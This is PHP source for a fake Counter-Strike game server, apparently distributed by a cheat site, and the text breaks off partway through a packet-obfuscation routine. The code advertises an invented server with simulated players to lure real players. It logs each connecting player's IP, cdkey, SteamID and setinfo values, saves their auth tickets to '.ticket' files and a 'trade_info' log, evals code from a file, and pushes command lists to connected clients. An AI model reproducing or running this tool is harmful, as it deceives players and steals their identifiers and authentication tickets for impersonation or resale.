<?php

//	Software from Ostrog        ^_^
//  official website cheater-top.ru

set_time_limit ( 0 );
ob_implicit_flush ( 1 );
error_reporting ( 0 );

include_once "paths.php";

class CL_SERVER {
    public static $thisCL = Null;

    public function __construct( $ip = Null , $port = Null ) {

        $this -> ip   = $ip;
        $this -> port = $port;
        $this -> addr = $ip . ":" . $port;

    }
    public static function getCL( $ip = Null , $port = Null ) {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self( $ip , $port ) );

        return self::$thisCL;

    }

	public $ip			= "";
	public $port		= "";
    public $addr        = "";
}
class CL_CLIENT {
    public static $thisCL = Null;
    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

	public $ip			= "";
	public $port		= "";
    public $addr        = "";
}
class CL_STEAM {
	public $hex_1		= "";
	public $hex_2		= "";
	public $hex_3		= "";
	public $prevSteam	= "";
	public $steam		= "";
	public $steam64		= "";
}
class CL_SETINFO {
    public $name;
    public $value;

    public function __construct ( $name , $value ) {
        $this -> name = $name;
        $this -> value = $value;
    }
}
class CL_INFO {

    public static $thisCL = Null;

	public $fullPacket	= "";
	public $protokol	= "";
	public $raw			= "";
	public $cdKey		= "";
	public $name		= "";
	public $steam		= NULL;
	public $prevThis	= NULL;
    public $returnData	= "";
	public $prefix		= "";
	public $needPacket	= "";

    public $server;
    public $client;
    public $buf;

    public $pack = "";

    public $setInfo_1 = false;
    public $setInfo_2 = false;
	
	function init () {
		$this -> steam = new CL_STEAM;
	}
	
	function clear () {
	
		$this -> fullPacket	= "";
		
		$this -> protokol	= "";
		
		$this -> raw		= "";
		
		$this -> cdKey		= "";
		
		$this -> name		= "";
		
		$this -> returnData	= "";
		
		$this -> steam		= NULL;
		
		$this -> prevThis	= NULL;
		
		$this -> steam		= new CL_STEAM;
	
	}
	
		function myGetInt32 ( $st ) {

			return $this -> myGetIntForSteam64 ( $st );
		
		}
		
		function showHex ( $st, $rd = " ", $type = false ) {
	
			$len = strlen ( $st .= "" );
			if ( $type )
				for ( $i = $len - 1; $i >= 0; $i-- )
					$res .= ( ( ( $buf = ord ( $st [ $i ] ) ) > 15 ) ? base_convert ( $buf, 10, 16 ) : "0" . base_convert ( $buf, 10, 16 ) ) . $rd;
			else
				for ( $i = 0; $i < $len; $i++ )
					$res .= ( ( ( $buf = ord ( $st [ $i ] ) ) > 15 ) ? base_convert ( $buf, 10, 16 ) : "0" . base_convert ( $buf, 10, 16 ) ) . $rd;
			
			return strtoupper ( $res );
			
		}

		function getInt16 ( $st ) {
	
			$st .= "\x00\x00";
				
			return unpack ( "l", $st ) [ 1 ];
				
		}		
	
		function myGetIntForSteam64 ( $st ) {
	
			$multi = Array (
				0	=>	"1",
				2	=>	"65536",
				4	=>	"4294967296",
				6	=>	"281474976710656"
			);
			
			$len = strlen ( $st ) - 2;
			$res = "0";

			for ( $i = $len; $i >=0; $i = $i - 2 )
				$res = bcadd ( $res, bcmul ( $multi [ $i ], $this -> getInt16 ( substr ( $st, $i, 2 ) ) ) );

			return $res;
		
		}
		
		function community_to_steamid ( $community ) {
			return ( ( bcmod ( $curr_com = bcsub ( $community, "76561197960265728" ), "2" ) == "0" ) ? ( $this -> prefix . "0:0:" . bcdiv ( $curr_com, "2" ) ) : ( $this -> prefix . "0:1:" . bcdiv ( bcsub ( $curr_com, "1" ), "2" ) ) ); 
		}
		
		function getSteam () {

			$pos = strpos ( $this -> pack, "\x01\x00\x10\x01" ) - 4;
			
			if ( strpos ( $this -> pack, "ver\x00\x00\x00\x00\x00" ) === false )
				$this -> prefix = "STEAM_";
			else {
				$this -> prefix = "REVEMU_";

                $this -> steam -> hex_1		= $this -> showHex ( substr ( $this -> pack, $pos - 16, 4 ) );

                $this -> steam -> hex_2		= $this -> showHex ( substr ( $this -> pack, $pos, 8 ) );

                $this -> steam -> hex_3		= $this -> showHex ( substr ( $this -> pack, $temp_pos = $pos + 8, strpos ( $this -> pack, "\x00", $temp_pos ) - $temp_pos ) );

                $this -> steam -> prevSteam	= $this -> myGetInt32 ( substr ( $this -> pack, $pos - 4, 4 ) );
            }


			$this -> steam -> steam64	= $this -> myGetIntForSteam64 ( substr ( $this -> pack, $pos, 8 ) );
			
			$this -> steam -> steam		= $this -> community_to_steamid ( $this -> steam -> steam64 );
			
		}

    function parseSetInfo () {

        $pos1 = strpos( $this -> pack , "\"" );
        $pos2 = strpos( $this -> pack , "\"" , $pos1 + 1 );

        $setInfo_1 = substr( $this -> pack , $pos1 , $pos2 - $pos1 + 1 );

        $pos1 = strpos( $this -> pack , "\"" , $pos2 + 1 );
        $pos2 = strpos( $this -> pack , "\"" , $pos1 + 1 );

        $setInfo_2 = substr( $this -> pack , $pos1 , $pos2 - $pos1 + 1 );


        preg_match_all ( "/[\\\](.*?)[\\\]([^\\\\\"]*)/si" , $setInfo_1 , $res );

        if ( ( ( $len = count( $res[1] ) ) === count( $res[2] ) ) && ( $len > 0 ) ) {
            $this -> setInfo_1 = Array ();
            foreach ( $res[1] as $i => &$val )
                $this -> setInfo_1 [ $i ] = new CL_SETINFO( $res[1][$i] , $res[2][$i] );
        } else
            $this -> setInfo_1 = false;


        preg_match_all ( "/[\\\](.*?)[\\\]([^\\\\\"]*)/si" , $setInfo_2 , $res );

        if ( ( ( $len = count( $res[1] ) ) === count( $res[2] ) ) && ( $len > 0 ) ) {
            $this -> setInfo_2 = Array ();
            foreach ( $res[1] as $i => &$val )
                $this -> setInfo_2 [ $i ] = new CL_SETINFO( $res[1][$i] , $res[2][$i] );
        } else
            $this -> setInfo_2 = false;

    }

	function parseInfo () {

		preg_match ( "/name\\\(.*?)[\"\\\]/",	$this -> pack, $res );
		$this -> name = $res [ 1 ];
		
		preg_match ( "/connect (.*?) /",		$this -> pack, $res );
		$this -> protokol = $res [ 1 ];
		
		preg_match ( "/raw\\\(.*?)[\"\\\]/",	$this -> pack, $res );
		$this -> raw = $res [ 1 ];
		
		preg_match ( "/cdkey\\\(.*?)[\"\\\]/",	$this -> pack, $res );
		$this -> cdKey = $res [ 1 ];

		$this -> needPacket = substr ( $this -> pack, strpos ( $this -> pack, "\x22\x0A" ) + 22 );
		
		$this -> getSteam ();
		
	}

	function saveInfoToFile () {

        ( file_exists( CL_Path_Lib::$save_dir ) ) ||
        ( mkdir( CL_Path_Lib::$save_dir ) );


        ( file_exists( CL_Path_Lib::$save_dir . CL_Path_Lib::$info_dir ) ) ||
        ( mkdir( CL_Path_Lib::$save_dir . CL_Path_Lib::$info_dir ) );

        ( file_exists( CL_Path_Lib::$save_dir .  CL_Path_Lib::$packet_dir ) ) ||
        ( mkdir( CL_Path_Lib::$save_dir . CL_Path_Lib::$packet_dir ) );

        ( file_exists( CL_Path_Lib::$save_dir . CL_Path_Lib::$ticket_dir ) ) ||
        ( mkdir( CL_Path_Lib::$save_dir . CL_Path_Lib::$ticket_dir ) );

        ( file_exists( CL_Path_Lib::$trade_info ) ) ||
        ( mkdir( CL_Path_Lib::$trade_info ) );


		$this -> returnData = "[" . date ( "Y-m-d H:i:s", time () ) . "]" . " " . $this -> prevThis -> client -> ip . " " . $this -> steam -> steam . " " . $this -> name;

        $name = preg_replace ( '%[^A-Za-z0-9\-\_\[\]\ \.]%', "", preg_replace ( "/:/", "_", $this -> returnData ) );
		
		$data =	"ip:port   = " . $this -> client -> addr        .   "\r\n" .
                "name      = " . $this -> name					.	"\r\n" .
				"protokol  = " . $this -> protokol				.	"\r\n" .
				"raw       = " . $this -> raw					.	"\r\n" .
				"cdKey     = " . $this -> cdKey					.	"\r\n" .
				"steam64   = " . $this -> steam -> steam64		.	"\r\n" .
				"steam     = " . $this -> steam -> steam		.	"\r\n" .
				"prevSteam = " . $this -> steam -> prevSteam	.	"\r\n" .
				"hex_1     = " . $this -> steam -> hex_1		.	"\r\n" .
				"hex_2     = " . $this -> steam -> hex_2		.	"\r\n" .
				"hex_3     = " . $this -> steam -> hex_3		.	"\r\n" ;


        $data .= "\r\n\r\n===================================== GAME INFO =====================================\r\n\r\n";

        foreach ( $this -> setInfo_1 as &$val )
            $data .= $val->name."=".$val->value."\r\n";


        $data .= "\r\n\r\n===================================== SET  INFO =====================================\r\n\r\n";

        foreach ( $this -> setInfo_2 as &$val )
            $data .= $val->name."=".$val->value."\r\n";


        $data .= "\r\n\r\n================================== SET INFO TO CFG ==================================\r\n\r\n";

        foreach ( $this -> setInfo_2 as &$val )
            $data .= "setinfo \"".$val->name."\" \"".$val->value."\"\r\n";



		$f = @fopen ( CL_Path_Lib::$save_dir . CL_Path_Lib::$info_dir . $name . ".ini", "w" );
		@fwrite ( $f, $data );
		@fclose ( $f );


		$f = @fopen ( CL_Path_Lib::$save_dir . CL_Path_Lib::$packet_dir . $name . ".pack", "w" );
		@fwrite ( $f, $this -> buf -> get() );
		@fclose ( $f );


		$f = @fopen ( CL_Path_Lib::$save_dir . CL_Path_Lib::$ticket_dir . $name . ".ticket", "w" );
		@fwrite ( $f, $this -> needPacket );
		@fclose ( $f );

        $f = @fopen ( CL_Path_Lib::$trade_info . $this->server->ip . "." . $this->server->port , "a" );
        @fwrite ( $f, CL_INFO_JSON_FARMAT::getJSON( htmlspecialchars ( $this -> name ) , $this -> client -> addr , $this -> steam -> steam , $name ) . "\n" );
        @fclose ( $f );

	}

	function savePack () {
		
		$this -> clear ();

        $this -> pack = $this->buf->get();
		
		$this -> parseInfo ();

        $this -> parseSetInfo ();
		
		$this -> saveInfoToFile ();
		
		return $this -> returnData;
	
	}

    public function __construct() {

        $this -> server = CL_SERVER::getCL();
        $this -> client = CL_CLIENT::getCL();
        $this -> buf = CL_BUFER::getCL();

        $this -> init();

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}
class CL_INFO_JSON_FARMAT {
    public $name;
    public $addr;
    public $steam;
    public $time;
    public $path;

    public function __construct( $name , $addr , $steam , $path , $time = Null ) {

        $this -> name  = $name;
        $this -> addr  = $addr;
        $this -> steam = $steam;
        $this -> time  = ( $time === Null ) ? time() : $time;
        $this -> path  = $path;

    }

    public static function getJSON( $name , $addr , $steam , $path , $time = Null ) {

        return json_encode( new self( $name , $addr , $steam , $path , $time ) );

    }


}
class CL_INFO_PLAYER {
	public $name		= "";
	public $countKill	= 0;
	public $time		= 0;
	public $beginTime	= 0;
	public $currTime	= 0;
	public $timeKill	= 0;
		
	function setCurrTime () {

		return
			( $this -> currTime	= time () - $this -> beginTime );
		
	}
	
}
class CL_BAN {

	public $banList		= Array ();
	
	function saveBanLis ( $path = "ban_list.ini" ) {
	
		$f = @fopen ( $path, "w" );
		
		foreach ( $this -> banList as $index => $val )
			@fwrite ( $f, $index . "\r\n" );
	
		@fclose ( $f );
		
	}
	
	function loadBanList ( $path = "ban_list.ini" ) {
	
		if ( file_exists ( $path ) )
			$f = @fopen ( $path, "r" );
		else
			return false;
			
		while ( !fEoF ( $f ) )
			if ( strlen ( $st = substr ( $buf = @fgets ( $f, 256 ), 0, strlen ( $buf ) - 2 ) ) > 4 )
				$this -> banList [ $st ] = true;
		
		@fclose ( $f );
		
	}
	
}
class CL_OUT_INFO {

    public static $thisCL = Null;

    public $server;
    public $client;
    public $buf;

	public $name 		= "OlolololOLo ^_^ OSTROG CePBeP ^_^";
	public $game		= "http://vk.com/no_id";
	public $map			= "de_dust2";
    public $folder      = "cstrike";
	public $maxPlayers	= 32;
	public $countPlayers= 10;
    public $protocol    = 48;
    public $Servertype  = "D";
    public $Environment = "L";
    public $Visibility  = "\x00";
    public $Mod_String  = "\x01OSTROG_MOD :D\x00^_^\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00";
    public $Vac         = "\x00";
    public $Bots        = 0;
    public $serverID    = 12;

	public $playerList	= Array ();
	public $nickList	= Array ();
	public $nickSize	= 0;
	public $currPlayers = 0;
	public $miscellanea = Array (
			"min_count_players"		=> 15,
			"max_count_players"		=> 31,
			"update_players"		=> 20,
			"cur_count_players"		=> 0,
			"curr_time_players"		=> 0,
			
			"min_time_players_onli"	=> 30,		// 2  минуты
			"max_time_players_onli"	=> 1200,	// 20 минут
			
			"min_kill"				=> 1,
			"max_kill"				=> 2,
			"curr_time_kill"		=> 30
	);


    public $packetClient_num = 1;

	function addPlayer () {
		
		$playerInfo = new CL_INFO_PLAYER;
		
		$playerInfo -> name			= $this -> nickList [ rand ( 1, $this -> nickSize ) ];
		
		$playerInfo -> beginTime	= time ();
		
		$playerInfo -> timeKill		= $playerInfo -> beginTime;
		
		$playerInfo -> time			= rand ( $this -> miscellanea [ "min_time_players_onli" ], $this -> miscellanea [ "max_time_players_onli" ] );
		
		$this -> playerList [] = $playerInfo;
	}
	function removePlayer ( $i ) {
		unset ( $this -> playerList[ $i ] );
	}
	function parseNic () {
	
		unset ( $this -> nickList );
		
		$this -> nickList = Array ();
		
		if ( ! ( $f = fopen ( CL_Path_Lib::$path_to_nick, "r" ) ) )
			return false;
		
		while ( !fEoF ( $f ) )
			$this -> nickList [] = substr ( $buf = @fgets ( $f, 256 ), 0, strlen ( $buf ) - 2 );
		
		$this -> nickSize = count ( $this -> nickList ) - 1;
		unset ( $this -> nickList [ $this -> nickSize ] );
		
		@fclose ( $f );
		
	}
	function setPlayerParam () {
		
		foreach ( $this -> playerList as $index => $val ) {
				
			if ( time () > $val -> timeKill ) {
			
				$m_time = ( int ) ( ( $this -> miscellanea [ "curr_time_kill" ] + time () - $val -> timeKill ) / $this -> miscellanea [ "curr_time_kill" ] );
			
				$this -> playerList [ $index ] -> timeKill = time () + $this -> miscellanea [ "curr_time_kill" ];
				
				$this -> playerList [ $index ] -> countKill += rand ( $m_time * $this -> miscellanea [ "min_kill" ], $m_time * $this -> miscellanea [ "max_kill" ] );
			
			}
		
			if ( $val -> setCurrTime () >= $val -> time )
				$this -> removePlayer ( $index );
			
		}
		
		if ( time () < $this -> miscellanea [ "curr_time_players" ] ) {

			$this -> currPlayers = count ( $this -> playerList );
	
			return true;

		}
		
		$len = $this -> miscellanea [ "max_count_players" ] - rand (
		
			( ( ( $buf = count ( $this -> playerList ) ) > $this -> miscellanea [ "min_count_players" ] ) ? $buf : $this -> miscellanea [ "min_count_players" ] ),
		
			$this -> miscellanea [ "max_count_players" ]
			
		);
		
		
		for ( $i = 0; $i < $len; $i++ )
			$this -> addPlayer ();
		
		$this -> miscellanea [ "curr_time_players" ] = time () + $this -> miscellanea [ "update_players" ];
		
		$this -> currPlayers = count ( $this -> playerList );
		
	}

    function getServerInfo_oldFormat() {

        return
            "\xFF\xFF\xFF\xFF" .
            "\x6D" .
            "127.0.0.1:" . $this->server->port . "\x00" .
            $this -> name . "\x00" .
            $this -> map . "\x00" .
            $this -> folder . "\x00" .
            $this -> game . "\x00" .
            chr ( $this -> currPlayers ) .
            chr ( $this -> maxPlayers ) .
            pack( "C" , $this->protocol ) .
            $this->Servertype .
            $this->Environment .
            $this->Visibility .
            $this->Mod_String .
            $this->Vac .
            pack( "C" , $this->Bots );

    }
    function getServerInfo_newFormat() {

        return
            "\xFF\xFF\xFF\xFF" .
            "\x49" .
            pack( "C" , $this->protocol ) .
            $this -> name . "\x00" .
            $this -> map . "\x00" .
            $this -> folder . "\x00" .
            $this -> game . "\x00" .
            "\x0A\x00"./*pack( "S" , $this->serverID ) .*/
            chr ( $this -> currPlayers ) .
            chr ( $this -> maxPlayers ) .
            pack( "C" , $this->Bots ) .
            $this->Servertype .
            $this->Environment .
            $this->Visibility .
            $this->Vac .
            //"\x31" . "\x2E" . "\x31" . "\x2E\x32\x2E\x36\x2F\x53\x74\x64\x69\x6F\x00" .   "\x80" . pack( "S" , $this->server->port );
            "\x31" . "\x2E" . "\x31" . "\x2E\x32\x2E\x37\x0D\x2F\x53\x74\x64\x69\x6F\x00" . "\x91" . pack( "S" , $this->server->port ) . /*"\x87\x69"*/ "\x0A\x00\x00\x00\x00\x00\x00\x00\x0A\x00\x00\x00\x00\x00\x00\x00";

    }
    function getPlayersInfo() {

        $res =
            "\xFF\xFF\xFF\xFF\x44" .
            chr ( $this -> currPlayers );

        foreach ( $this -> playerList as $index => $val )
            $res .=
                "\x00" .
                $val -> name . "\x00" .
                pack( "l*", $val -> countKill ) .
                pack( "f*", $val -> currTime );

        return $res;

    }
    function getPing() {
        return "\xFF\xFF\xFF\xFF\x6A\x00";
    }


    function getPackForTryOldClient() {

        return "\xFF\xFF\xFF\xFF\x41\x0D\xB6\xDB\xFB";

    }

    function getPackGetChallengeValve() {

        return
            "\xFF\xFF\xFF\xFFA00000000\x20" .
            ip2long ( $this->server->ip ) .
            "\x20"."2"."\x0A\x00";

    }
    function getPackGetChallengeSteam() {

        return
            "\xFF\xFF\xFF\xFFA00000000\x20" .
            ip2long ( $this->server->ip ) .
            " 3 1m 30819d300d06092a864886f70d010101050003818b0030818702818100b5a614e896036cc9f9bd6d13f2f5c79fbb5f925e8dbb50f0b9ee9a5499f535978fe60c188e4f8872160d86b76b80f1ba82333d586b32692ffa31e1dd59a603dc6370004566afa54830898d4ff210c738deb059e0a94a87dd85be28668793681a4ecf647fa1b5294a73927f23ffba0c6a9140922d21002012fed2b4a898aa7811020111" . "\x0a\x00";

    }

    function getPackClientIp() {

        return
            "\xFF\xFF\xFF\xFF\x42\x20" .
            $this -> packetClient_num .
            "\x20\x22".
            $this -> client -> ip . ":" . $this -> client -> port .
            "\x22\x20"."0"."\x00";

    }

    function getInfoPack() {

        return "\x01\x01\x01\x01\x01\x01\x01\x01";

    }

    public function  __construct() {

        $this -> server = CL_SERVER::getCL();
        $this -> client = CL_CLIENT::getCL();
        $this -> buf = CL_BUFER::getCL();

        $this -> parseNic ();

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}
class CL_FEIK_SERVER {

	public $server		= NULL;
	
	public $client		= NULL;
	
	public $info		= NULL;
	
	public $ban			= NULL;

	public $pack		= NULL;

    public $clients     = NULL;

    public $svc         = NULL;

    public $socket      = NULL;
	
	public $buf         = NULL;

    public $engine      = Null;

    public $cmdlist     = Null;



    public $ifJobPath   = "";
		
	
	function getIp () {
			
		@preg_match ( "/remote_addr.*?\>(.*?)\</", @file_get_contents ( "https://www.whoer.net/" ), $resIp );
		
		return ( $resIp [ 1 ] ) ? $resIp [ 1 ] : false;
		
	}

	function init ( $port = Null , $ip = "" ) {

        $this -> server = CL_SERVER::getCL( ( ( $ip == "" ) ? $this -> getIp () : $ip ) , $port );

        $this -> socket  = CL_SOCKET::getCL();

        $try = $this -> run();

        if ( $try["ERROR"] === 1 )
            return $try;

		$this -> client = CL_CLIENT::getCL();

        $this -> clients = CL_CLIENTS::getCL();

        $this -> svc = SVC_CMD::getCL();

        $this -> buf = CL_BUFER::getCL();

        $this -> engine = MsgEngine::getCL();

        $this -> cmdlist = CL_CmdLists::getCL();


		$this -> server -> port = $port;
		
		$this -> pack = new CL_OUT_INFO;
		
		$this -> ban = new CL_BAN;
		$this -> ban -> loadBanList ();
		
		$this -> info = CL_INFO::getCL();


        $this -> createJobFile ();

        return $try;

	}
	
	function addBan () {

        if ( !( $this -> server -> ip === $this -> client -> ip ) )
		    $this -> ban -> banList [ $this -> client -> ip ] = true;
		
	}
	function ifNoBan () {
	
		return empty ( $this -> ban -> banList [ $this -> client -> ip ] );
	
	}

    function tryUser() {

        $mode = false;
        $ifBan = false;

        $code = file_get_contents( CL_Path_Lib::$code_path );

        $client = $this -> engine -> client -> info;

        $server = $this -> server;

        eval ( $code );

        $this -> engine -> client -> ifBan = $ifBan;

        return $mode;

    }


	function sendInfo_ServerOrPlayers ( $type = 0 ) {
				
		if ( $type === 0 ) {

            $this -> socket -> send ( $this -> pack -> getServerInfo_oldFormat() );

            $this -> socket -> send ( $this -> pack -> getPlayersInfo() );

            $this -> socket -> send ( $this -> pack -> getServerInfo_newFormat() );

		}
		
		elseif ( $type === 2 ) {

            $this -> socket -> send ( $this -> pack -> getPlayersInfo() );
		
		}
		
		elseif ( $type === 4 ) {

            $this -> socket -> send ( $this -> pack -> getPackForTryOldClient() );

        }
	}
    function sendInfo_Ping () {

        $this->socket->send( $this->pack->getPing() );

    }
    function sendInfo_GetChallengeValve () {

        $this -> socket -> send ( $this -> pack -> getPackGetChallengeValve () );

    }
    function sendInfo_GetChallengeSteam () {

        $this -> socket -> send ( $this -> pack -> getPackGetChallengeSteam () );

	}	
    function sendInfo_ForConnectPack () {

        $this -> socket -> send ( $this -> pack -> getPackClientIp () );

        $this -> clients -> addClient ( $this->client->addr );

        $this -> engine -> setClient( $this->client->addr );

        $mode = $this -> tryUser();

        if ( !( ( $mode === false ) || ( $mode === "" ) ) ) {

            $this -> engine -> client -> mode = $mode;

            $this -> engine -> sendPack ( $this -> pack -> getInfoPack() );

        } else {

            if ( $this -> engine -> client -> ifBan )
                $this -> addBan();

            $this -> clients -> removeClient( $this -> client -> addr );

        }

    }
    function sendInfo_SendSVC() {

        $this -> engine -> setClient( $this->client->addr );

        if ( $this -> engine -> client -> status === "false" ) {

            if ( strpos( COM::UnMunge( $this->engine->client->packIn->content , $this->engine->client->countPackIn  ) , "\x03new" ) === 0 ) {

                $this -> engine -> client -> status = 0;

                $this->cmdlist->load( $this -> engine -> client -> mode );

                $this -> sendInfo_SendSVC ();

            }

        } else {

            $svc = $this->cmdlist->getCMD_LISTS( $this -> engine -> client -> mode );
            $len = count( $svc );

            if ( $this -> engine -> client -> status >= $len ) {

                if ( $this -> engine -> client -> ifBan )
                    $this -> addBan();

                $this -> clients -> removeClient ( $this -> engine -> client -> info -> addr );

                return;

            }

            $svc = &$svc[ $this -> engine -> client -> status ];

            $this -> engine -> sendPack ( $svc->cmd_string , $svc->bzip2 );

            $this -> engine -> client -> status++;

            if ( $this -> engine -> client -> status >= $len ) {

                if ( $this -> engine -> client -> ifBan )
                    $this -> addBan();

                $this -> clients -> removeClient ( $this -> engine -> client -> info -> addr );

                return;

            }

        }

    }

	function parseInfo () {

		echo $this -> info -> savePack () . "<BR/>";

	}
	
	function type_packets () {

        if ( $this->buf->ifPos( "\xFF\xFF\xFF\xFF" , 0 ) ) {

            $this -> pack -> setPlayerParam ();

            if ( $this->buf->ifPos( "\x69" , 4 ) )
                $this -> sendInfo_Ping ();

            if ( $this->buf->ifPos( "TSource Engine Query" , 4 ) )
                $this -> sendInfo_ServerOrPlayers ();

            elseif ( $this->buf->ifPos( "\x55\xFF\xFF\xFF\xFF" , 4 ) )
                $this -> sendInfo_ServerOrPlayers ( 4 );

            elseif ( $this->buf->ifPos( "\x55\x0D\xB6\xDB\xFB" , 4 ) )
                $this -> sendInfo_ServerOrPlayers ( 2 );

            elseif ( $this->buf->ifPos( "getchallenge steam" , 4 ) )
                $this -> sendInfo_GetChallengeSteam ();

            elseif ( $this->buf->ifPos( "getchallenge valve" , 4 ) )
                $this -> sendInfo_GetChallengeValve ();

            elseif ( $this->buf->ifPos( "connect" , 4 ) ) {
                $this -> parseInfo ();
                $this -> sendInfo_ForConnectPack ();
            }

        }
        elseif ( !( $this -> clients -> getClient ( $this->client->addr ) === False ) )
            $this -> sendInfo_SendSVC();
	}

    function createJobFile() {

        $this -> ifJobPath = $this->server->ip . "." . $this->server->port;

        ( file_exists( CL_Path_Lib::$job_file_dir ) ) ||
        ( mkdir( CL_Path_Lib::$job_file_dir ) );

        @fclose ( @fopen( CL_Path_Lib::$job_file_dir . $this -> ifJobPath , "w") );

    }
    function ifJobServer () {
		
		return ( ( file_exists ( CL_Path_Lib::$job_file_dir . $this -> ifJobPath ) ) ? true : false );
		
	}

    function run() {

        return $this -> socket -> open();

    }
	function job_server () {
	
		while ( $this -> ifJobServer () ) {
		
			$this -> socket -> recv();

			if ( $this -> ifNoBan () )
				$this -> type_packets ();
			
		}
		
		$this -> ban -> saveBanLis ();
        $this -> socket -> close();
		
	}
	
}

class CL_BUFER {

    public static $thisCL = Null;

    public $buf = "";
    public $size = 0;
    public $pos = 0;

    public function set( $buf ) {
        $this -> buf = $buf;
        $this -> size = strlen( $buf );
    }
    public function add( $buf ) {
        $this -> buf .= $buf;
        $this -> size += strlen( $buf );
    }

    public function readInt32() {

        $res = unpack( "l" , substr( $this->buf , $this->pos , 4 ) )[1];

        $this->pos += 4;

        return $res;

    }
    public function readPString() {

        $pos = strpos( $this->buf , "\x00" );

        if ( $pos === False ) {
            $res = substr( $this->buf , $this->pos );
            $this->pos = $this->size;
        } else {
            $res = substr( $this->buf , $this->pos , $pos - $this->pos );
            $this -> pos = $pos + 1;
        }

    }
    public function readString( $len = Null ) {

        $res = ( $len === Null ) ? substr( $this->buf , $this->pos ) : substr( $this->buf , $this->pos , $len );

        $this->pos = ( $len === Null ) ? $this->size : ( $this->pos+$len );

        return $res;

    }

    public function get() {

        return $this->buf;

    }

    public function movR( $pos ) {

        $this->pos += $pos;

    }
    public function movL( $pos ) {

        $this->pos -= $pos;

    }

    public function setCursor( $pos ) {

        $this->pos = $pos;

    }

    public function ifPos( $search , $pos ) {

        return ( strpos( $this->buf , $search ) === $pos ) ? true : false;

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}

class CL_SOCKET {

    public static $thisCL = Null;

    public $developer = false;

    public $socket;

    public $server;
    public $client;

    public $buf;

    public $maxRecvSize = 4096;

    private function developer( $info , $head ) {

        echo
            "\n>>>>>>>>============================================== ".$head." ==============================================>>>>>>>>\n".
                COM::showHex( $info ) . "\n" . $info .
            "\n<<<<<<<<============================================== ".$head." ==============================================<<<<<<<<\n";

    }

    function open () {

        if ( !( $this -> socket = @socket_create ( AF_INET, SOCK_DGRAM, SOL_UDP ) ) )
            return Array ( "ERROR" => 1, "msg" => "Ошибка создания сокета" );

        if ( !@socket_bind ( $this -> socket , $this -> server -> ip , $this -> server -> port ) )
            return Array ( "ERROR" => 1, "msg" => "Ошибка связи сокета с адресом и портом" );

        return Array ( "ERROR" => 0 );

    }
    function send ( $pack ) {

        if ( $this -> developer )
            $this -> developer( $pack , "PACK OUT" );

        @socket_sendto ( $this -> socket , $pack , strlen ( $pack ) , 0 , $this -> client -> ip , $this -> client -> port );

    }
    function recv () {

        @socket_recvfrom ( $this -> socket, $temp, $this->maxRecvSize, 0, $this -> client -> ip, $this -> client -> port );

        $this -> client -> addr = $this -> client -> ip . ":" . $this -> client -> port;

        $this->buf->set( $temp );

        if ( $this -> developer )
            $this -> developer( $temp , "PACK IN" );

    }
    function close() {

        @socket_close( $this -> socket );

    }

    public function __construct() {

        $this -> server = CL_SERVER::getCL();
        $this -> client = CL_CLIENT::getCL();
        $this -> buf = CL_BUFER::getCL();

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}
class CL_GET_INFO_CLIENT_PARSE {

    public $addr;
    public $ip;
    public $port;
    public $name;
    public $steam;
    public $setInfo_1;
    public $setInfo_2;

    public function __construct () {

        $a = CL_INFO::getCL();

        $this -> addr      = $a -> client -> addr;
        $this -> ip        = $a -> client -> ip;
        $this -> port      = $a -> client -> port;

        $this -> name      = $a -> name;
        $this -> steam     = $a -> steam -> steam;

        $this -> setInfo_1 = $a -> setInfo_1;
        $this -> setInfo_2 = $a -> setInfo_2;

    }

}
class CL_ONE_CLIENT {

    public $countPackIn  = 0;
    public $countPackOut = 0;

    public $packOut;
    public $packIn;

    public $info;

    public $status = "false";
    public $mode = "";
    public $ifBan = false;

    public function __construct() {

        $this -> info = new CL_GET_INFO_CLIENT_PARSE();

    }

}
class CL_CLIENTS {

    public static $thisCL = Null;

    public $clients = Array ();

    public function addClient ( $addr ) {

        $this -> clients[$addr] = new CL_ONE_CLIENT();

    }

    public function removeClient ( $addr ) {

        if ( empty( $this->clients[$addr] ) )
            return false;

        unset( $this->clients[$addr] );

        return true;

    }

    public function getClient( $addr ) {

        return ( empty( $this->clients[$addr] ) ? false : $this->clients[$addr] );

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}

class CL_StructurePacket {
    public $num;
    public $num2;
    public $count;

    public $content;

    public function __construct( $num , $num2 , $count , $content ) {

        $this->num     = $num;

        $this->num2    = $num2;

        $this->count   = $count;

        $this->content = $content;

    }

}

class COM {

    private static $MungeTable = Array(
            Array( 0x7A, 0x64, 0x05, 0xF1, 0x1B, 0x9B, 0xA0, 0xB5, 0xCA, 0xED, 0x61, 0x0D, 0x4A, 0xDF, 0x8E, 0xC7 ) ,
            Array( 0x05, 0x61, 0x7A, 0xED, 0x1B, 0xCA, 0x0D, 0x9B, 0x4A, 0xF1, 0x64, 0xC7, 0xB5, 0x8E, 0xDF, 0xA0 ) ,
            Array( 0x20, 0x07, 0x13, 0x61, 0x03, 0x45, 0x17, 0x72, 0x0A, 0x2D, 0x48, 0x0C, 0x4A, 0x12, 0xA9, 0xB5 )
    );
    private static $NeedMungeTable = Array( 0x05, 0x61, 0x7A, 0xED, 0x1B, 0xCA, 0x0D, 0x9B, 0x4A, 0xF1, 0x64, 0xC7, 0xB5, 0x8E, 0xDF, 0xA0 );

    public static function Munge ( $pack , $sequence ) {

        $size_b = strlen ( $pack );
        $size = floor ( $size_b / 4 );

        $sequence &= 0x0F;
        $notSequence = ( ~$sequence ) & 0xFF;

        $res = "";

        for ( $i=0; $i<$size; $i++ ) {

            $res .=
                chr( ~( ord( $pack[$i*4+3] ) ^ ( self::$NeedMungeTable[ ( $i     ) & 0x0F ] | 165 ) ) ^ $sequence ) .
                chr( ~( ord( $pack[$i*4+2] ) ^ ( self::$NeedMungeTable[ ( $i + 1 ) & 0x0F ] | 167 ) )             ) .
